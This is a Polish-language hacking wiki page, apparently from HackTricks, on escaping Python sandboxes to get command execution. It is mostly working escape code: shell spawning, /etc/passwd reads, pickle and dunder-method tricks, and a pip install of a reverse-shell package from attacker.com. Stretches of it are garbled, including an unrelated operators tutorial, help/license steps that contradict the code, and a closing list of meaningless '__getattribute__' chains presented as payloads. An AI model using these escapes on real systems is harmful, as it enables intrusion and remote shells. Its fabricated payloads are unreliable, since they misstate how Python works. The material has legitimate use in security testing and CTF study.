# Omijanie piaskownic Pythona

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby szybko je naprawić. Intruder śledzi powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

Oto kilka sztuczek, które umożliwiają omijanie zabezpieczeń piaskownic Pythona i wykonywanie dowolnych poleceń.

## Biblioteki do wykonywania poleceń

Pierwszą rzeczą, którą musisz wiedzieć, jest to, czy możesz bezpośrednio wykonywać kod za pomocą już zaimportowanej biblioteki, czy też możesz zaimportować którąś z tych bibliotek:
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
Pamiętaj, że funkcje _**open**_ i _**read**_ mogą być przydatne do **odczytywania plików** wewnątrz piaskownicy Pythona i do **pisania kodu**, który można **wykonać**, aby **obejść** piaskownicę.

{% hint style="danger" %}
Funkcja **input()** w Pythonie 2 pozwala na wykonanie kodu Pythona przed awarią programu.
{% endhint %}

Python próbuje **załadować biblioteki z bieżącego katalogu jako pierwsze** (następujące polecenie wyświetli, skąd Python ładuje moduły): `python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## Ominięcie piaskownicy pickle za pomocą domyślnie zainstalowanych pakietów Pythona

### Domyślne pakiety

Możesz znaleźć **listę preinstalowanych** pakietów tutaj: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
Należy zauważyć, że z pickle można spowodować, że środowisko Pythona **zaimportuje dowolne biblioteki** zainstalowane w systemie.\
Na przykład, poniższy pickle, po załadowaniu, zaimportuje bibliotekę pip, aby jej użyć:
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
Aby uzyskać więcej informacji na temat działania modułu pickle, sprawdź ten link: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### Pakiet Pip

Sztuczka udostępniona przez **@isHaacK**

Jeśli masz dostęp do `pip` lub `pip.main()`, możesz zainstalować dowolny pakiet i uzyskać odwróconą powłokę, wykonując:
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
Pakiet do tworzenia odwróconej powłoki możesz pobrać tutaj. Przed użyciem należy go **rozpakować, zmienić `setup.py` i wprowadzić swój adres IP dla odwróconej powłoki**:

{% file src="../../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
Ten pakiet nazywa się `Reverse`. Jednak został specjalnie stworzony tak, że gdy opuścisz odwróconą powłokę, reszta instalacji zakończy się niepowodzeniem, więc **nie zostanie zainstalowany żaden dodatkowy pakiet Pythona na serwerze** po opuszczeniu.
{% endhint %}

## Wykonanie kodu Pythona za pomocą eval

{% hint style="warning" %}
Należy zauważyć, że exec pozwala na wieloliniowe ciągi znaków i ";", ale eval nie (sprawdź operator walrus).
{% endhint %}

Jeśli pewne znaki są zabronione, można użyć reprezentacji **szesnastkowej/ósemkowej/B64**, aby **obejść** ograniczenie:
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### Inne biblioteki umożliwiające wykonywanie kodu Pythona

There are several other libraries that can be used to evaluate Python code within a sandboxed environment. These libraries provide additional features and functionalities compared to the built-in `eval()` function. Some of these libraries include:

- **`ast` module**: The `ast` module provides a way to parse and manipulate Python abstract syntax trees (AST). It can be used to evaluate code safely by inspecting and validating the code before execution.

- **`execnet` library**: `execnet` is a library that allows the execution of code in isolated Python environments. It provides a secure way to run untrusted code by creating separate Python interpreters for each execution.

- **`pysandbox` library**: `pysandbox` is a library specifically designed for sandboxing Python code. It provides a restricted execution environment where potentially harmful operations are blocked or limited.

- **`PyPy sandbox`**: PyPy is an alternative Python interpreter that includes a sandboxing feature. The PyPy sandbox restricts the execution of code by disabling certain dangerous operations and limiting resource usage.

- **`RestrictedPython` library**: `RestrictedPython` is a library that provides a restricted execution environment for Python code. It allows fine-grained control over what operations are allowed and provides a secure way to execute untrusted code.

These libraries can be used depending on the specific requirements and constraints of the application. It is important to carefully evaluate and choose the appropriate library based on the desired level of security and functionality.
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## Operatorzy i krótkie sztuczki

### Operatorzy

- `==` - operator porównania równości
- `!=` - operator porównania nierówności
- `>` - operator większości
- `<` - operator mniejszości
- `>=` - operator większości lub równości
- `<=` - operator mniejszości lub równości
- `and` - operator logiczny "i"
- `or` - operator logiczny "lub"
- `not` - operator logiczny "nie"

### Krótkie sztuczki

- `x = x + 1` można zastąpić przez `x += 1`
- `x = x - 1` można zastąpić przez `x -= 1`
- `x = x * 2` można zastąpić przez `x *= 2`
- `x = x / 2` można zastąpić przez `x /= 2`
- `x = x % 2` można zastąpić przez `x %= 2`
- `x = x ** 2` można zastąpić przez `x **= 2`
- `x = x // 2` można zastąpić przez `x //= 2`

### Przykłady

```python
x = 5
y = 10

if x == 5 and y > 8:
    print("Warunek spełniony")

z = 3
z += 1
print(z)  # Output: 4

w = 6
w **= 2
print(w)  # Output: 36
```

### Uwagi

- Operatorzy i krótkie sztuczki mogą być używane do skrócenia i uproszczenia kodu.
- Ważne jest, aby zrozumieć, jak działają operatorzy logiczne i jakie są ich priorytety.
- Pamiętaj, że niektóre skróty mogą wpływać na czytelność kodu, więc używaj ich z umiarem.
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## Omijanie zabezpieczeń za pomocą kodowania (UTF-7)

W [**tym opracowaniu**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) używane jest kodowanie UTF-7 do wczytania i wykonania dowolnego kodu Pythona w pozornym sandboxie:
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
Możliwe jest również obejście tego za pomocą innych kodowań, np. `raw_unicode_escape` i `unicode_escape`.

## Wykonanie kodu Pythona bez wywołań

Jeśli znajdujesz się w więzieniu Pythona, które **nie pozwala na wywoływanie**, istnieją nadal sposoby na **wykonywanie dowolnych funkcji, kodu** i **komend**.

### RCE za pomocą [dekoratorów](https://docs.python.org/3/glossary.html#term-decorator)
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### RCE tworzenie obiektów i przeciążanie

Jeśli możesz **zadeklarować klasę** i **utworzyć obiekt** tej klasy, możesz **napisać/nadpisać różne metody**, które mogą być **wywoływane** **bez** **konieczności bezpośredniego ich wywoływania**.

#### RCE za pomocą niestandardowych klas

Możesz zmodyfikować niektóre **metody klasy** (_poprzez nadpisanie istniejących metod klasy lub utworzenie nowej klasy_), aby wykonywały dowolny kod, gdy zostaną **wywołane** bez bezpośredniego ich wywoływania.
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### Tworzenie obiektów za pomocą [metaklas](https://docs.python.org/3/reference/datamodel.html#metaclasses)

Kluczową rzeczą, którą metaklasy pozwalają nam zrobić, jest **utworzenie instancji klasy bez bezpośredniego wywoływania konstruktora**, poprzez utworzenie nowej klasy z docelową klasą jako metaklasą.
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### Tworzenie obiektów za pomocą wyjątków

Kiedy zostanie **wywołane wyjątkiem**, obiekt **Exception** jest **tworzony** bez konieczności bezpośredniego wywoływania konstruktora (szczegół opisany przez [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### Więcej RCE

#### Bypassowanie piaskownic Pythona

W przypadku, gdy napotkasz piaskownicę Pythona, istnieje kilka technik, które możesz wykorzystać do jej obejścia i uzyskania zdalnego wykonania kodu (RCE). Oto kilka z tych technik:

1. **Bypassowanie modułu `os`**: W niektórych przypadkach, moduł `os` może być ograniczony w piaskownicy Pythona. Możesz spróbować obejść to, korzystając z innych modułów, takich jak `subprocess` lub `shlex`.

2. **Wykorzystywanie modułów wbudowanych**: W piaskownicy Pythona niektóre moduły mogą być zablokowane, ale nadal możesz korzystać z modułów wbudowanych, takich jak `sys`, `builtins` lub `__import__`, aby wykonać kod.

3. **Wykorzystywanie funkcji `eval` i `exec`**: Jeśli funkcje `eval` i `exec` nie są zablokowane w piaskownicy Pythona, możesz je wykorzystać do wykonania kodu.

4. **Wykorzystywanie modułów zewnętrznych**: Jeśli piaskownica Pythona blokuje dostęp do niektórych modułów zewnętrznych, możesz spróbować znaleźć inne moduły, które oferują podobne funkcje i nie są blokowane.

5. **Wykorzystywanie błędów w piaskownicy**: Czasami piaskownica Pythona może zawierać błędy, które można wykorzystać do jej obejścia. Możesz spróbować znaleźć takie błędy i wykorzystać je do zdalnego wykonania kodu.

Pamiętaj, że każda piaskownica Pythona może mieć inne ograniczenia i zabezpieczenia. Dlatego zawsze warto przeprowadzić badania i testy, aby znaleźć odpowiednie techniki obejścia dla konkretnej piaskownicy.
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### Odczytaj plik za pomocą wbudowanych funkcji help & license

Aby odczytać zawartość pliku za pomocą wbudowanych funkcji `help` i `license`, wykonaj następujące kroki:

1. Zaimportuj moduł `builtins`:
```python
import builtins
```

2. Użyj funkcji `help`, aby wyświetlić dokumentację dla modułu `builtins`:
```python
help(builtins)
```

3. Użyj funkcji `license`, aby wyświetlić licencję dla Pythona:
```python
license()
```

Powyższe kroki pozwolą Ci odczytać zawartość pliku za pomocą wbudowanych funkcji `help` i `license`.
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby móc je szybko naprawić. Intruder śledzi powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Wbudowane funkcje

* [**Wbudowane funkcje w python2**](https://docs.python.org/2/library/functions.html)
* [**Wbudowane funkcje w python3**](https://docs.python.org/3/library/functions.html)

Jeśli masz dostęp do obiektu **`__builtins__`**, możesz importować biblioteki (zauważ, że tutaj można również użyć innej reprezentacji ciągu znaków pokazanej w ostatniej sekcji):
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### Brak wbudowanych funkcji

Gdy nie masz `__builtins__`, nie będziesz w stanie zaimportować niczego, ani nawet odczytać ani zapisać plików, ponieważ **wszystkie globalne funkcje** (takie jak `open`, `import`, `print`...) **nie są wczytywane**.\
Jednak **domyślnie python importuje wiele modułów do pamięci**. Te moduły mogą wydawać się niewinne, ale niektóre z nich **również importują niebezpieczne** funkcjonalności, do których można uzyskać dostęp w celu uzyskania nawet **wykonania dowolnego kodu**.

W poniższych przykładach można zobaczyć, jak **nadużyć** niektórych z tych wczytanych "**niewinnych**" modułów, aby uzyskać dostęp do **niebezpiecznych** **funkcjonalności** wewnątrz nich.

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3

Python3 is a powerful programming language that is widely used for various purposes, including web development, data analysis, and automation. It provides a rich set of libraries and frameworks that make it easy to develop complex applications.

However, Python3 also has a feature called "sandboxing" that restricts the execution of certain operations for security reasons. Sandboxing is commonly used in cloud/SaaS platforms to prevent malicious code from accessing sensitive resources or causing harm.

In this guide, we will explore techniques to bypass Python3 sandboxes and execute restricted operations. These techniques can be useful for penetration testers or security researchers who want to test the effectiveness of sandboxing mechanisms or identify potential vulnerabilities.

Please note that bypassing Python3 sandboxes without proper authorization is illegal and unethical. This guide is intended for educational purposes only and should not be used for any malicious activities.

Let's dive into the world of Python3 sandbox bypassing techniques and explore the various methods that can be used to overcome these restrictions.
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**Poniżej znajduje się większa funkcja**](./#rekurencyjne-wyszukiwanie-wbudowanych-globalnych) do znalezienia dziesiątek/**setek** **miejsc**, gdzie można znaleźć **wbudowane** funkcje.

#### Python2 i Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### Wbudowane ładunki

The following payloads can be used to bypass Python sandboxes by exploiting built-in functions and modules:

Poniższe ładunki mogą być używane do obejścia piaskownic Pythona poprzez wykorzystanie wbudowanych funkcji i modułów:

#### `__import__`

This payload uses the `__import__` function to import a module and execute arbitrary code.

Ten ładunek wykorzystuje funkcję `__import__` do importowania modułu i wykonania dowolnego kodu.

```python
__import__('os').system('command')
```

#### `eval`

This payload uses the `eval` function to evaluate arbitrary code.

Ten ładunek wykorzystuje funkcję `eval` do oceny dowolnego kodu.

```python
eval('__import__("os").system("command")')
```

#### `exec`

This payload uses the `exec` function to execute arbitrary code.

Ten ładunek wykorzystuje funkcję `exec` do wykonania dowolnego kodu.

```python
exec('__import__("os").system("command")')
```

#### `compile`

This payload uses the `compile` function to compile and execute arbitrary code.

Ten ładunek wykorzystuje funkcję `compile` do skompilowania i wykonania dowolnego kodu.

```python
compile('__import__("os").system("command")', '', 'exec')
```

#### `setattr`

This payload uses the `setattr` function to set an attribute and execute arbitrary code.

Ten ładunek wykorzystuje funkcję `setattr` do ustawienia atrybutu i wykonania dowolnego kodu.

```python
setattr(__import__('os'), 'attr', lambda: os.system('command'))
```

#### `type`

This payload uses the `type` function to create a new class and execute arbitrary code.

Ten ładunek wykorzystuje funkcję `type` do utworzenia nowej klasy i wykonania dowolnego kodu.

```python
type('ClassName', (object,), {'attr': lambda self: os.system('command')})
```

#### `__builtins__`

This payload uses the `__builtins__` module to execute arbitrary code.

Ten ładunek wykorzystuje moduł `__builtins__` do wykonania dowolnego kodu.

```python
__builtins__.__import__('os').system('command')
```

#### `__class__`

This payload uses the `__class__` attribute to execute arbitrary code.

Ten ładunek wykorzystuje atrybut `__class__` do wykonania dowolnego kodu.

```python
().__class__.__base__.__subclasses__()[index]('command')
```

#### `__bases__`

This payload uses the `__bases__` attribute to execute arbitrary code.

Ten ładunek wykorzystuje atrybut `__bases__` do wykonania dowolnego kodu.

```python
().__class__.__bases__[index]('command')
```

#### `__subclasses__`

This payload uses the `__subclasses__` method to execute arbitrary code.

Ten ładunek wykorzystuje metodę `__subclasses__` do wykonania dowolnego kodu.

```python
().__class__.__subclasses__()[index]('command')
```

#### `__mro__`

This payload uses the `__mro__` attribute to execute arbitrary code.

Ten ładunek wykorzystuje atrybut `__mro__` do wykonania dowolnego kodu.

```python
().__class__.__mro__[index]('command')
```

#### `__init_subclass__`

This payload uses the `__init_subclass__` method to execute arbitrary code.

Ten ładunek wykorzystuje metodę `__init_subclass__` do wykonania dowolnego kodu.

```python
().__class__.__init_subclass__('command')
```

#### `__getattribute__`

This payload uses the `__getattribute__` method to execute arbitrary code.

Ten ładunek wykorzystuje metodę `__getattribute__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command')
```

#### `__getattr__`

This payload uses the `__getattr__` method to execute arbitrary code.

Ten ładunek wykorzystuje metodę `__getattr__` do wykonania dowolnego kodu.

```python
().__class__.__getattr__('command')
```

#### `__getattribute__` + `__call__`

This payload uses the combination of `__getattribute__` and `__call__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__` i `__call__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__call__()
```

#### `__getattribute__` + `__init__`

This payload uses the combination of `__getattribute__` and `__init__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__` i `__init__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__init__()
```

#### `__getattribute__` + `__new__`

This payload uses the combination of `__getattribute__` and `__new__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__` i `__new__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__new__()
```

#### `__getattribute__` + `__getattribute__`

This payload uses the combination of two `__getattribute__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację dwóch metod `__getattribute__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command')
```

#### `__getattribute__` + `__getattr__`

This payload uses the combination of `__getattribute__` and `__getattr__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__` i `__getattr__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattr__('command')
```

#### `__getattribute__` + `__getattribute__` + `__call__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, and `__call__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__` i `__call__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__call__()
```

#### `__getattribute__` + `__getattribute__` + `__init__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, and `__init__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__` i `__init__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__init__()
```

#### `__getattribute__` + `__getattribute__` + `__new__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, and `__new__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__` i `__new__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__new__()
```

#### `__getattribute__` + `__getattribute__` + `__getattribute__`

This payload uses the combination of three `__getattribute__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację trzech metod `__getattribute__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattribute__('command')
```

#### `__getattribute__` + `__getattribute__` + `__getattr__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, and `__getattr__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__` i `__getattr__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattr__('command')
```

#### `__getattribute__` + `__getattribute__` + `__getattribute__` + `__call__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, `__getattribute__`, and `__call__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__`, `__getattribute__` i `__call__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattribute__('command').__call__()
```

#### `__getattribute__` + `__getattribute__` + `__getattribute__` + `__init__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, `__getattribute__`, and `__init__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__`, `__getattribute__` i `__init__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattribute__('command').__init__()
```

#### `__getattribute__` + `__getattribute__` + `__getattribute__` + `__new__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, `__getattribute__`, and `__new__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__`, `__getattribute__` i `__new__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattribute__('command').__new__()
```

#### `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattribute__`

This payload uses the combination of four `__getattribute__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację czterech metod `__getattribute__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattribute__('command').__getattribute__('command')
```

#### `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattr__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, `__getattribute__`, and `__getattr__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__`, `__getattribute__` i `__getattr__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattribute__('command').__getattr__('command')
```

#### `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattribute__` + `__call__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__`, and `__call__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__` i `__call__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattribute__('command').__getattribute__('command').__call__()
```

#### `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattribute__` + `__init__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__`, and `__init__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__` i `__init__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattribute__('command').__getattribute__('command').__init__()
```

